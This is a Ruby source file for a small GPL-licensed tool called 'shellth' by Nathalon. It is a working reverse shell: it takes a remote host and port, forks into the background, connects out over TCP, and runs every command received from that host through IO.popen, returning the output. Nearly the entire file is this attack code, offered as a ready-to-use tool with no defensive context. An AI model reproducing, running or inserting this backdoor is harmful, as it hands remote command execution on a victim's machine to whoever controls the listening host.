# Copyright (C) 2022, Nathalon

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

require 'socket'
require 'ostruct'
require 'optparse'

class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
end

class Shellth

  puts '------------------------------------------------------------------------'.green
  puts '                    .__           .__  .__   __  .__                    '.green     
  puts '               _____|  |__   ____ |  | |  |_/  |_|  |__                 '.green
  puts '              /  ___/  |  \_/ __ \|  | |  |\   __\  |  \                '.green
  puts '              \___ \|   Y  \  ___/|  |_|  |_|  | |   Y  \               '.green
  puts '             /____  >___|  /\___  >____/____/__| |___|  /               '.green
  puts '                  \/     \/     \/                    \/                '.green
  puts '------------------------------------------------------------------------'.green

  Version = "\t    Version: (shellth 0.0.1), written by (Nathalon)".green

  def parser(arguments)
    ARGV << "-h" if ARGV.empty?
    @options = OpenStruct.new
	
    opts = OptionParser.new do |opts|
      opts.banner = "Usage: #{__FILE__} [options]"
	  
      opts.on("-r", "--rhost ", String,
        "Specify the host to connect to") do |rhost|
         @options.rhost = rhost
      end

      opts.on("-p", "--port ", Integer,
        "Specify the TCP port") do |port|
         @options.port = port
      end

        opts.on("-V", "--version", "Show version and exit") do
        puts Version
        exit
      end

      opts.on("-h", "--help", "Show help and exit") do
        puts opts
        exit
      end
    end

    begin
      opts.parse!(arguments)

    rescue OptionParser::ParseError => err
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "#{err.message}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Exiting .."
      puts '------------------------------------------------------------------------'.red
      exit
    end

    if @options.port == nil
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "No port specified to #{@options.port}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Exiting .."
      puts '------------------------------------------------------------------------'.red
      exit
    end
  end

  def connect
    begin
      puts "[*] ".green + "Connecting to: " + "(#{@options.rhost})".green + " on port " + "(#{@options.port})".green 

      exit if fork
      socket = TCPSocket.new(@options.rhost, @options.port)
      
    rescue SocketError => err
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Error [1]: " + "#{err}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Exiting .."
      puts '------------------------------------------------------------------------'.red
      exit
      
    rescue Errno::EHOSTUNREACH => err
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Error [1]: " + "#{err}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Exiting .."
      puts '------------------------------------------------------------------------'.red
      exit
      
    rescue Errno::ECONNREFUSED => err
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Error [1]: " + "#{err}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "Exiting .."
      puts '------------------------------------------------------------------------'.red
      exit
    end

      puts "[*]".green + " Starting at: " + "(#{Time.now})".green
      puts "[*]".green + " Operating System:" + " (#{RUBY_PLATFORM})".green
      puts '------------------------------------------------------------------------'.green
      puts "[*]".green + " Status: " + "(Connection Established!)".green
      puts "[*]".green + " Remote Host: " + "(#{@options.rhost})".green + " Remote Port: " + "(#{@options.port})".green
      puts '------------------------------------------------------------------------'.green
      puts "[*]".green + " Exiting at: "+ "(#{Time.now})".green
      puts '------------------------------------------------------------------------'.green

      while(cmd=socket.gets)
      IO.popen(cmd, "r"){|io|socket.print io.read}
  end
end
      
  def run(arguments)
    parser(arguments)
    connect
  end
end

shell = Shellth.new
shell.run(ARGV)
